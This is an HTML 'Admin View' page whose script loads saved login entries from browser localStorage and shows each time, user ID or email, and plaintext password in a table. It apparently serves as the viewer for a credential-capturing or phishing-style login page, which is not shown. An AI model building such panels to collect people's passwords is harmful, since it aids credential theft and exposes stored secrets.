<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin View</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f0f2f5;
        }
        .admin-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        h2 {
            color: #1a73e8;
            margin-bottom: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #1a73e8;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #f8f9fa;
        }
        button {
            padding: 10px 20px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-right: 10px;
        }
        button:hover {
            background-color: #1557b0;
        }
    </style>
</head>
<body>
    <div class="admin-container">
        <h2>Admin View - Login Entries</h2>
        <button onclick="loadEntries()">Refresh</button>
        <table>
            <thead>
                <tr>
                    <th>Time</th>
                    <th>User ID/Email</th>
                    <th>Password</th>
                </tr>
            </thead>
            <tbody id="entriesTable">
            </tbody>
        </table>
    </div>

    <script>
        function loadEntries() {
            const entries = JSON.parse(localStorage.getItem('loginEntries') || '[]');
            const table = document.getElementById('entriesTable');
            table.innerHTML = '';
            
            entries.reverse().forEach(entry => {
                const row = table.insertRow();
                row.insertCell(0).textContent = entry.time;
                row.insertCell(1).textContent = entry.userid;
                row.insertCell(2).textContent = entry.password;
            });
        }

        // Load entries when page opens
        loadEntries();
    </script>
</body>
</html>
